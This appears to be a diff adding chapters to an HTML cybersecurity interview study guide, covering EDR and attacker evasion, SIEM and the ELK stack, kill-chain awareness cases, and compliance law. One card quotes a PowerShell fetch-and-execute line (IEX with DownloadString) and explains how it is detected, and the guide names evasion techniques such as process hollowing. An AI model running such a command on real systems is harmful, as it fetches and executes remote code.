+        <div class="sum-card"><div class="sum-card-title">Firewall Evolution</div><div class="sum-card-text">Packet filtering (stateless, header only) → Stateful (connection tracking, state table) → NGFW (DPI + app awareness + integrated IPS) → Cloud-native (micro-segmentation, elastic scale).</div></div>
+        <div class="sum-card"><div class="sum-card-title">EDR vs Traditional AV</div><div class="sum-card-text">AV matches file signatures — blind to zero-days, fileless, LotL attacks. EDR monitors behavior continuously — detects anomalies in process creation, memory, network without signatures. Deployed on endpoints not network perimeter.</div></div>
+        <div class="sum-card"><div class="sum-card-title">APT Detection</div><div class="sum-card-text">Wireshark (DPI), Suricata (NIDS rule-based), Cuckoo Sandbox (behavioral malware analysis), MISP (threat intel sharing), AlienVault OTX (community threat data), Vectra AI (ML anomaly detection).</div></div>
+        <div class="sum-card"><div class="sum-card-title">Process Hollowing</div><div class="sum-card-text">Spawn legitimate process suspended → overwrite memory with malicious code → resume. EDR sees svchost.exe but it's executing attacker code. Detected by in-memory vs on-disk image comparison.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Fileless Malware</div><div class="sum-card-text">Executes in memory only — PowerShell IEX, WMI event subscriptions, reflective DLL injection. No disk artifact. File-based AV completely blind. Requires memory scanning and behavioral detection.</div></div>
+        <div class="sum-card"><div class="sum-card-title">EDR + SIEM</div><div class="sum-card-text">EDR: deep endpoint telemetry (narrow). SIEM: wide correlation across all sources. Together: EDR alert triggers SIEM correlation revealing campaign scope. Neither sufficient alone.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-edr">EDR</span><div class="term-name">Behavioral analysis</div><div class="term-def">EDR builds baseline of normal endpoint activity. Deviations trigger investigation. Word spawning PowerShell, PowerShell making network connections, LSASS accessed by non-system process — all behavioral anomalies.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Evasion</span><div class="term-name">Process hollowing</div><div class="term-def">Launch svchost.exe in suspended state → unmap memory → inject malicious code → resume. EDR sees trusted process name. Detected by comparing in-memory image to on-disk executable.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Evasion</span><div class="term-name">Living off the Land (LotL)</div><div class="term-def">Using pre-installed Windows tools (PowerShell, WMI, certutil, mshta) instead of custom malware. No new binaries = no signatures to match. Requires behavioral detection to catch.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Evasion</span><div class="term-name">Reflective DLL injection</div><div class="term-def">Load malicious DLL directly into process memory without Windows loader. Never written to disk. File-based EDR modules can't see it. Detected by memory scanning for PE headers in RWX memory without disk backing.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Malware</span><div class="term-name">Fileless malware via IEX</div><div class="term-def">IEX (New-Object Net.WebClient).DownloadString('URL') downloads and executes script in memory. Nothing written to disk. PowerShell script block logging captures it even without a file.</div></div>
+        <div class="term-card"><span class="term-badge b-edr">Detection</span><div class="term-name">Beaconing</div><div class="term-def">Periodic regular outbound connections from compromised endpoint to C2 server. Characteristic APT behavior. Detected by analyzing connection timing regularity and identifying consistent intervals to external IPs.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">What is Living off the Land (LotL) and why is it hard to detect?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>LotL refers to attackers using tools already present on the victim's system — legitimate Windows utilities — rather than introducing new malware binaries. Common tools: PowerShell (scripting, download/execute, credential harvesting via Invoke-Mimikatz), WMI (persistence, remote code execution), certutil (file download), mshta (execute remote scripts), regsvr32 (code execution), WMIC (enumeration, lateral movement). No new files = no file hashes for AV to match, no new executables for whitelisting to block.</p><p>Why it's hard to detect: PowerShell, cmd.exe, and WMI are whitelisted by default on virtually every Windows system — they're legitimate administrative tools. The malicious activity blends with normal usage. A network admin legitimately uses PowerShell for remote management; an attacker using PowerShell for lateral movement looks similar in basic logs. Detection requires behavioral analysis: knowing that PowerShell should not be spawned by Office documents, that Invoke-Mimikatz patterns represent credential harvesting, or that certutil downloading from an external IP is unusual for standard users. Mitigations: PowerShell script block logging (captures commands even encoded), transcription logging, execution policy with AppLocker enforcement, monitoring WMI subscription creation events.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">SOC alert: svchost.exe making regular outbound connections to external IP at 5-minute intervals. Triage steps?</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Regular interval outbound from a Windows system process = classic C2 beaconing indicator. Triage: <strong>1) IP reputation:</strong> Query VirusTotal, AbuseIPDB, Shodan. Known C2 server? Tor exit node? Anonymous VPN provider? <strong>2) Process tree:</strong> Legitimate svchost.exe is ALWAYS spawned by services.exe. Pull process tree from EDR. If spawned by anything else — process hollowing confirmed. <strong>3) In-memory vs on-disk:</strong> Compare svchost.exe in-memory image to disk executable. Mismatch = code injection.</p><p><strong>4) Traffic analysis:</strong> What port? 443 (HTTPS encrypted C2), 53 (DNS tunneling)? Data volume per connection? C2 check-ins are typically tiny packets. <strong>5) SIEM correlation:</strong> Is this IP appearing on other endpoints? Campaign or isolated? <strong>6) Contact user:</strong> Via out-of-band channel (phone) — is anyone actually using that machine right now? <strong>7) Escalate:</strong> If strong indicators — isolate endpoint via EDR containment (stops lateral movement without alerting attacker). Capture memory dump before shutdown. Begin IR: document timeline, check all endpoints communicating with that IP, review authentication logs from the host.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">Why is EDR + SIEM integration considered best practice rather than either alone?</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>EDR sees deep but narrow — rich telemetry from individual endpoints (process creation, file access, memory operations) but limited to devices where deployed. Doesn't natively see network traffic between systems, server-side logs, cloud activity, or email gateway events. SIEM sees wide but shallow — aggregates logs from firewalls, servers, cloud, email, endpoints — but events are lower resolution than EDR telemetry.</p><p>Together: EDR detects anomalous PowerShell execution on a workstation and sends the alert with full process telemetry to the SIEM. The SIEM correlates with: firewall logs showing outbound connections to the same IP from three other workstations, email gateway logs showing a phishing email delivered to all four users two hours earlier. The SIEM now has the full picture — phishing campaign affecting multiple users — rather than four separate unrelated endpoint alerts. Integration also powers automated response: SIEM creates high-priority incident, automatically triggers EDR playbook to isolate all four endpoints, creates firewall rule to block the C2 IP — before a human analyst starts investigating. Neither tool alone would have connected these events into a campaign-level picture.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="chapter" data-search="siem log collection event correlation anomaly detection elk stack elasticsearch logstash kibana filebeat grok ueba utm dlp">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 12</span>
+    <div class="ch-info">
+      <div class="ch-title">SIEM</div>
+      <div class="ch-desc">Log collection, event correlation, anomaly detection (ML, UEBA), ELK Stack (Beats→Logstash→Elasticsearch→Kibana), grok parsing, SIEM deployment models, UTM vs SIEM vs DLP.</div>
+      <div class="ch-tags"><span class="ch-tag">SIEM</span><span class="ch-tag">ELK Stack</span><span class="ch-tag">Anomaly Detection</span><span class="ch-tag">UEBA</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">SIEM Core Functions</div><div class="sum-card-text">Data aggregation, normalization, event correlation, alerting, dashboards, data storage, analysis, automated incident response, compliance management, forensic analysis.</div></div>
+        <div class="sum-card"><div class="sum-card-title">ELK Stack Flow</div><div class="sum-card-text">Beats (Filebeat ships logs) → Logstash (grok parsing, field extraction, enrichment) → Elasticsearch (distributed indexed storage) → Kibana (visualization, dashboards, investigation).</div></div>
+        <div class="sum-card"><div class="sum-card-title">Grok Filter</div><div class="sum-card-text">Logstash plugin parsing unstructured log text into structured JSON fields. Turns Apache log line into client_ip, method, request, response_code fields. Essential for making logs queryable in Elasticsearch.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Detection Methods</div><div class="sum-card-text">Signature-based (regex, YARA, Snort rules), rule-based (custom analyst rules), correlation (linking events across sources), anomaly detection (ML baseline + deviation), UEBA (user behavior scoring).</div></div>
+        <div class="sum-card"><div class="sum-card-title">Forensic Analysis</div><div class="sum-card-text">Timestamped logs reconstruct timelines. NTP sync critical — seconds difference misleads causality analysis. Data enrichment adds geolocation, user identity, threat intel context.</div></div>
+        <div class="sum-card"><div class="sum-card-title">SIEM vs UTM vs DLP</div><div class="sum-card-text">SIEM: detects and investigates. UTM: prevents attacks at network layer. DLP: prevents data exfiltration. All three serve different purposes — none replaces the others.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-siem">SIEM</span><div class="term-name">Event correlation</div><div class="term-def">Linking related events across multiple log sources to identify attack patterns invisible in individual logs. Failed logins (network) + successful login (auth) + file access (server) = potential brute force + breach.</div></div>
+        <div class="term-card"><span class="term-badge b-siem">SIEM</span><div class="term-name">Anomaly detection</div><div class="term-def">Baseline normal behavior then alert on statistically significant deviations. User accessing DB at 2am Sunday triggers alert with no matching signature. Uses K-means clustering, isolation forest, autoencoders.</div></div>
+        <div class="term-card"><span class="term-badge b-siem">SIEM</span><div class="term-name">UEBA</div><div class="term-def">User and Entity Behavior Analytics. Assigns risk scores from multiple weak signals: access time + volume + location + resource type. Effective for compromised credentials and insider threats.</div></div>
+        <div class="term-card"><span class="term-badge b-siem">ELK</span><div class="term-name">Filebeat</div><div class="term-def">Lightweight log shipper in the Beats family. Monitors log files, ships new entries to Logstash or Elasticsearch. Maintains file position registry — no data loss on crash. The data collection agent.</div></div>
+        <div class="term-card"><span class="term-badge b-siem">ELK</span><div class="term-name">Grok filter (Logstash)</div><div class="term-def">Parses unstructured log text into structured fields using named patterns. Turns raw Apache log into queryable fields (client_ip, response_code, bytes). Without grok, logs are unsearchable raw text.</div></div>
+        <div class="term-card"><span class="term-badge b-siem">SIEM</span><div class="term-name">Data enrichment</div><div class="term-def">Augmenting raw logs with context: IP → geolocation, username → identity/role/department, IP → threat intel verdict. Transforms "1.2.3.4 failed login" into "Russia/Tor exit node attacking Finance Director account."</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">What is event correlation in a SIEM and why is it more powerful than individual logs?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Event correlation links related security events from multiple disparate sources to identify attack patterns invisible when each log is viewed in isolation. Most attacks leave evidence in multiple systems simultaneously, but no single system sees the full picture.</p><p>Classic example: firewall logs show 500 failed SSH attempts from IP 1.2.3.4 (suspicious but alone = possibly misconfigured system). Authentication server shows successful SSH login from same IP immediately after (concerning but alone = could be legitimate). File system logs show a large archive created in /tmp (suspicious alone = could be backup). Correlated: SIEM raises critical alert — "brute force succeeded, data staging for exfiltration." Another example: "impossible travel" — user authenticates from New York at 9am and London at 10am. Neither login is individually suspicious (both succeed). SIEM correlation on timing + geolocation = impossible travel alert. This is why SIEM is the central tool for SOC analysts — the correlation capability surfaces attacks that would never be detected reviewing individual system logs.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">Walk through the ELK Stack components and data flow.</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p><strong>Beats (Filebeat):</strong> Installed on source systems. Monitors log files and ships new entries. Maintains a registry of position in each file — ensures no entries missed even on crash. Winlogbeat ships Windows events, Metricbeat ships system metrics. <strong>Logstash:</strong> Ingest and transformation pipeline. Input plugins fetch data from Beats or other sources. Filter plugins parse and transform — grok converts raw Apache log text "192.168.1.1 - - [28/Sep/2023:13:30:45] GET /login 200 2326" into structured fields: client_ip, timestamp, method, request, response_code, bytes. Mutate filter renames/removes fields. GeoIP filter adds location data. Output plugins send to Elasticsearch. <strong>Elasticsearch:</strong> Distributed search and storage. Stores parsed JSON documents in indices. Sharded across cluster nodes for scalability and redundancy. Lucene-based full-text search. REST API for queries. <strong>Kibana:</strong> Visualization UI. Queries Elasticsearch and presents as charts, dashboards, heatmaps. Discover view for ad-hoc log searches. Security-specific views for SOC investigation. The power: Logstash's grok parsing transforms raw unstructured logs into structured data Elasticsearch can search by any field — without grok, you'd have millions of raw text lines with no way to filter by response code or source IP.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">Tier 1 SOC alert: multiple failed logins then success for user jdoe from IP 185.220.101.4. Walk through triage.</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Possible credential brute force with successful authentication. <strong>Step 1 — Context:</strong> How many failed attempts? What timeframe? Machine-speed (dozens per second) or manual? Which service (SSH, VPN, O365, web app)? Is jdoe an active account? <strong>Step 2 — IP reputation:</strong> Query VirusTotal, AbuseIPDB, Shodan. Is 185.220.101.4 a known Tor exit node? (This IP actually is.) VPN provider? Datacenter in unusual country? Previous SIEM appearances? <strong>Step 3 — Geolocation vs baseline:</strong> Where does jdoe normally authenticate from? Pull 30 days of auth history. If jdoe normally logs from Houston TX and this IP is Romania via Tor — strong compromise indicator. <strong>Step 4 — Post-auth activity:</strong> What did jdoe do AFTER the successful login? Query all jdoe events in the next 30 minutes. File access patterns? Privilege escalation attempts? New process execution? Outbound connections? Attackers move immediately after gaining access. <strong>Step 5 — User verification:</strong> Contact jdoe via out-of-band method (phone, verified Slack DM — NOT email which attacker may control). "Are you currently logged in from this IP?" If no → escalate immediately, request account lockout, session termination. <strong>Step 6 — Document everything</strong> with timestamps for IR handoff.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="chapter" data-search="security awareness ctf capture the flag kill chain secure coding defense in depth shift left security by design">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 13</span>
+    <div class="ch-info">
+      <div class="ch-title">Spreading Security Awareness</div>
+      <div class="ch-desc">CTF types (Jeopardy, Attack-Defense), secure coding practices, security by design, defense in depth, kill chain triage sessions (GitHub secrets, Jenkins brute force).</div>
+      <div class="ch-tags"><span class="ch-tag">CTF</span><span class="ch-tag">Secure Coding</span><span class="ch-tag">Kill Chain Triage</span><span class="ch-tag">Security Culture</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">CTF Types</div><div class="sum-card-text">Jeopardy (independent challenges: web, crypto, forensics, RE, pwn). Attack-Defense (teams attack opponents while defending own systems). Mixed. Platforms: TryHackMe, HackTheBox, PicoCTF, DEFCON.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Security by Design</div><div class="sum-card-text">Security as a core requirement from the first design discussions — not an afterthought. Equifax breach: unpatched vulnerability = security as afterthought. Security by design would have included mandatory patching as operational requirement.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Defense in Depth</div><div class="sum-card-text">Multiple independent, overlapping layers of protection. If one layer fails, others still protect. No single point of failure. Kill chain analysis shows how multiple simultaneous failures chain into full compromise.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Kill Chain 1 (GitHub → Production)</div><div class="sum-card-text">SSH cert committed to GitHub → used to access UAT → weak ACLs allow UAT→production pivot → cert on UAT grants production access. Every step independently preventable.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Kill Chain 2 (Jenkins → Backdoor)</div><div class="sum-card-text">Exposed Jenkins → brute forced (company@123) → Script Console RCE → DevOps password in logs → production Jenkins via password reuse → app backdoored. MFA + lockout + unique credentials breaks every link.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Why Kill Chain Triage Works</div><div class="sum-card-text">Makes security requirements concrete — developers see exactly how their specific mistake enabled a full breach. More motivating than policy compliance. Builds empathy for security requirements.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-aware">CTF</span><div class="term-name">Jeopardy-style CTF</div><div class="term-def">Independent challenges across categories (web, crypto, RE, forensics, pwn, stego). Each challenge worth points based on difficulty. Most common format for learning. TryHackMe and PicoCTF use this format.</div></div>
+        <div class="term-card"><span class="term-badge b-code">Secure Coding</span><div class="term-name">Default deny policy</div><div class="term-def">All access denied unless explicitly granted. Prevents accidentally granting broad permissions. Applied at application level (authorization logic) and firewall level (network access rules).</div></div>
+        <div class="term-card"><span class="term-badge b-code">Secure Coding</span><div class="term-name">No hardcoded secrets</div><div class="term-def">API keys, passwords, certificates must never appear in source code. Use environment variables, secure config management, or secrets vaults. Source repos are shared widely — hardcoded secrets = exposed secrets.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Design</span><div class="term-name">Defense in Depth</div><div class="term-def">Multiple independent overlapping security controls so no single failure is catastrophic. Attacker must defeat every layer. Kill chain analysis: any ONE of four failed controls would have broken the chain and prevented the breach.</div></div>
+        <div class="term-card"><span class="term-badge b-aware">Awareness</span><div class="term-name">Kill chain triage session</div><div class="term-def">Walking developers through a real attack chain step-by-step. Most effective security awareness technique — makes abstract requirements concrete by showing real consequences of specific decisions.</div></div>
+        <div class="term-card"><span class="term-badge b-code">Secure Coding</span><div class="term-name">Secure logging</div><div class="term-def">Never log passwords, session tokens, PII, or API keys. Kill Chain 2: DevOps password logged during auth → found by attacker → production compromise. Audit log contents regularly.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">In Kill Chain 2 (Jenkins), what specific controls would have broken the attack chain?</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Kill Chain 2 succeeded because five failures occurred simultaneously. Any one being fixed breaks the chain: <strong>MFA on Jenkins:</strong> Brute forcing the password is irrelevant if MFA is required — attacker gets the password but can't authenticate. <strong>Account lockout:</strong> After 5-10 failed attempts, lock the account. Automated brute force becomes impossible. <strong>No internet exposure:</strong> Jenkins should not be accessible from the internet. VPN or IP whitelist required. <strong>Script Console access control:</strong> Not all Jenkins users need Script Console access. Principle of least privilege — restrict to specific admin roles. <strong>No credential logging:</strong> The DevOps password should never have appeared in a log. Secure logging practices + log redaction tools prevent this. <strong>Unique passwords per environment:</strong> Password reuse is what turned a dev Jenkins compromise into a production compromise. Unique credentials for every environment mean a dev breach stays contained. <strong>Build script integrity monitoring:</strong> Any change to build scripts should trigger an alert and require review. The backdoor modification would have been detected before it reached production.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">Why is defense in depth more effective than relying on a single security control?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Any single security control can fail — a firewall can be misconfigured, AV can miss a new malware strain, a developer can forget to validate a specific input. If you rely on only one control, its failure equals complete compromise.</p><p>With defense in depth, the attacker must successfully defeat every layer to achieve their objective. Kill Chain 1 illustrates this: the attacker succeeded because multiple layers failed simultaneously — no secrets scanning, no environment segregation, no network ACLs, no credential rotation. If even one had been in place, the chain would have broken. In practice, defense in depth across typical environments includes: network perimeter (firewall/WAF), network segmentation (VLANs), endpoint protection (EDR), application security (input validation, parameterized queries), identity (MFA, RBAC, least privilege), data protection (encryption at rest and in transit), monitoring and detection (SIEM, IDS/IPS), and incident response. No individual layer needs to be perfect — you need enough layers that defeating all of them exceeds the attacker's motivation and resources.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">How would you build a security awareness program for developers with no current security culture?</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p><strong>Phase 1 — Make it real:</strong> Start with a kill chain triage session using a real breach (CircleCI, GitHub secrets case study). Walk through each step showing how a specific developer action caused a full production compromise. Follow with a 30-minute CTF session on TryHackMe — experiencing both attacking and being told to fix it creates understanding no training video can. <strong>Phase 2 — Integrate into workflows:</strong> Add SAST (SonarQube) with inline IDE feedback (SonarLint plugin). Developers get immediate security feedback as they code — security becomes part of the coding experience. Add Dependabot for dependency scanning, Git Secrets as pre-commit hook. Make secure the path of least resistance. <strong>Phase 3 — Shared responsibility:</strong> Require security review in design meetings (not separate sessions). Write explicit security acceptance criteria for user stories. Rotate developers into security-focused code review roles. Recognize developers who catch security issues. <strong>Phase 4 — Continuous learning:</strong> Monthly CTF challenges (30 minutes), shared Slack channel for security news relevant to your tech stack, optional brown-bags on new attack techniques. Goal: developers who automatically ask "is this input validated?" and "are we logging anything sensitive?" because they understand what happens when the answer is no.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="chapter" data-search="law compliance hipaa pci dss gdpr ccpa iso 27001 cobit nist csf audit frameworks cisa cissp privacy data protection">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 14</span>
+    <div class="ch-info">
+      <div class="ch-title">Law &amp; Compliance in Cyberspace</div>
+      <div class="ch-desc">ISO 27001, COBIT, NIST CSF, HIPAA (Privacy/Security Rules), PCI-DSS (6 objectives), GDPR, CCPA, global privacy laws, CISA/CIA/CISSP certifications.</div>
+      <div class="ch-tags"><span class="ch-tag">HIPAA</span><span class="ch-tag">PCI-DSS</span><span class="ch-tag">GDPR</span><span class="ch-tag">ISO 27001</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">Framework Comparison</div><div class="sum-card-text">ISO 27001: only certifiable, annual third-party audits, ISMS. COBIT: IT governance/business alignment, no certification. NIST CSF: 5 functions (Identify/Protect/Detect/Respond/Recover), highly flexible, self-assessment.</div></div>
+        <div class="sum-card"><div class="sum-card-title">HIPAA</div><div class="sum-card-text">Protects PHI. Privacy Rule: permissible uses, minimum necessary standard, patient rights. Security Rule: admin/technical/physical safeguards for ePHI. 60-day breach notification. BAAs required for business associates.</div></div>
+        <div class="sum-card"><div class="sum-card-title">PCI-DSS</div><div class="sum-card-text">6 objectives: secure network, protect cardholder data (encrypt, tokenize, minimize), vulnerability management, access controls (need-to-know), monitoring/testing (annual pen test, quarterly vuln scans), security policy.</div></div>
+        <div class="sum-card"><div class="sum-card-title">GDPR</div><div class="sum-card-text">EU law, global reach. Explicit consent required. Right to be forgotten, data portability, right to access. 72-hour breach notification. Fines: up to 4% of global revenue or €20M. Already: Meta €1.2B, Amazon €746M.</div></div>
+        <div class="sum-card"><div class="sum-card-title">CCPA</div><div class="sum-card-text">California privacy law. Rights to know, delete, opt-out of data sale. Opt-out model (vs GDPR's opt-in). Applies to for-profit businesses meeting size thresholds. $2,500-$7,500 per intentional violation.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Compliance ≠ Security</div><div class="sum-card-text">Target was PCI-DSS compliant when 40M card numbers were stolen. Compliance = point-in-time minimum floor. Security = ongoing adaptive protection. Organizations should use compliance as baseline then exceed it.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-law">Framework</span><div class="term-name">ISO/IEC 27001</div><div class="term-def">Only major certifiable security framework. Organizations undergo mandatory annual audits. Risk-based approach. Annex A: 114 controls across 14 categories. ISMS framework for comprehensive information security management.</div></div>
+        <div class="term-card"><span class="term-badge b-law">Framework</span><div class="term-name">NIST CSF — 5 Functions</div><div class="term-def">Identify (assets/risks), Protect (controls/training), Detect (monitoring/anomaly detection), Respond (incident response), Recover (restoration/lessons learned). Continuous improvement cycle. Basis for FISMA compliance.</div></div>
+        <div class="term-card"><span class="term-badge b-law">HIPAA</span><div class="term-name">Business Associate (BA)</div><div class="term-def">Any service provider handling PHI on behalf of a covered entity. Must sign Business Associate Agreement (BAA). Directly liable under HITECH for Security Rule compliance. Includes cloud providers, IT vendors, billing services.</div></div>
+        <div class="term-card"><span class="term-badge b-law">HIPAA</span><div class="term-name">Minimum Necessary Standard</div><div class="term-def">Covered entities must limit PHI disclosure to minimum necessary for the intended purpose. Specialist requesting treatment history should not receive complete lifetime medical record. Core privacy principle.</div></div>
+        <div class="term-card"><span class="term-badge b-law">PCI-DSS</span><div class="term-name">Tokenization</div><div class="term-def">Replacing cardholder data (PAN) with non-exploitable token. Merchant only sees token, not actual card number. Reduces PCI-DSS compliance scope. Token is useless outside tokenization system.</div></div>
+        <div class="term-card"><span class="term-badge b-law">GDPR</span><div class="term-name">72-hour breach notification</div><div class="term-def">GDPR requires reporting personal data breaches to supervisory authority within 72 hours of discovery if risk to individuals. If high risk, individuals must also be notified without undue delay. HIPAA equivalent: 60 days.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">What are the three types of HIPAA Security Rule safeguards with examples?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p><strong>Administrative safeguards</strong> — policies, procedures, and management activities protecting ePHI. Examples: conducting regular risk assessments to identify vulnerabilities, developing a risk management policy, workforce training programs, designating a HIPAA Security Officer, implementing sanction policies for violations. <strong>Technical safeguards</strong> — technology and related policies controlling access to ePHI. Examples: unique user IDs for each person (no shared accounts), automatic session logoff after inactivity, audit logs of who accessed what ePHI and when, encryption of ePHI at rest and in transit (TLS for transmission), emergency access procedures for critical situations. <strong>Physical safeguards</strong> — physical measures protecting electronic information systems from unauthorized access. Examples: securing server rooms with locked doors and badge access, workstation use policies (screen positioning to prevent shoulder surfing), documented procedures for secure disposal of hardware containing ePHI (degaussing, shredding). All three categories are required — organizations cannot compensate for missing one category with extra controls in another.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">Why is compliance not the same as security?</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Compliance and security are related but fundamentally different. Compliance means meeting the minimum requirements of a specific standard at a specific point in time. Security means actually protecting systems from threats in an ongoing, adaptive manner. The most powerful evidence: Target was PCI-DSS compliant when 40 million credit card numbers were stolen via an HVAC vendor's network access. Being compliant provided no protection. Compliance is point-in-time — a company that passes its annual QSA assessment may be breached six months later due to a new vulnerability or misconfiguration introduced after the audit.</p><p>Compliance standards are generic by necessity — they must apply to every organization in scope. A healthcare system and a one-doctor practice both must comply with HIPAA, but their threat profiles differ enormously. Compliance encourages minimum viable security — organizations implementing only what's needed to pass the audit. This checkbox security mentality creates a false sense of protection. Other examples: Marriott, Equifax, Capital One were all compliant with relevant standards near the time of their major breaches. The correct relationship: compliance is a floor, not a ceiling. Use compliance as a structured baseline, then conduct threat modeling specific to your environment, implement controls based on actual risk profile, and continuously improve based on the evolving threat landscape — not just the annual compliance calendar.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">What are the key differences between GDPR and CCPA?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p><strong>Scope:</strong> GDPR applies globally to any organization processing EU residents' personal data — no size threshold. CCPA applies to California-based for-profit businesses meeting specific thresholds ($25M revenue, 50K+ consumers, or 50%+ revenue from data sale). <strong>Consent model:</strong> GDPR requires explicit opt-in consent for most data processing. CCPA is an opt-out model — organizations can collect and use data; consumers must actively request to opt out. <strong>Breach notification:</strong> GDPR requires 72-hour notification to supervisory authority. CCPA provides a private right of action for breaches but no specific timeframe for notification to authorities. <strong>Fines:</strong> GDPR up to 4% of global annual revenue or €20M. CCPA: $2,500 per unintentional violation, $7,500 per intentional violation. GDPR is significantly higher — Meta received €1.2B, Amazon €746M. <strong>Individual rights:</strong> Both provide access and deletion rights. GDPR additionally includes data portability (receive data in machine-readable format to take to another service) and the "right to be forgotten." CCPA specifically focuses on the right to opt out of data sale — a right GDPR doesn't have in the same framing. GDPR is generally considered stricter across every dimension. CCPA has inspired similar laws in 10+ US states, trending toward GDPR-like opt-in requirements.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="chapter" data-search="python scapy pycryptodome volatility memory forensics powershell powersploit bash red team aes sha256 rsa">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 15</span>
+    <div class="ch-info">
+      <div class="ch-title">Python, Bash &amp; PowerShell Proficiency</div>
+      <div class="ch-desc">Scapy (packet crafting/sniffing), PyCryptodome (AES/SHA-256/RSA), Volatility memory forensics, Pymem, PowerSploit (offensive PS), script block logging (defensive), Bash Red Team operations.</div>
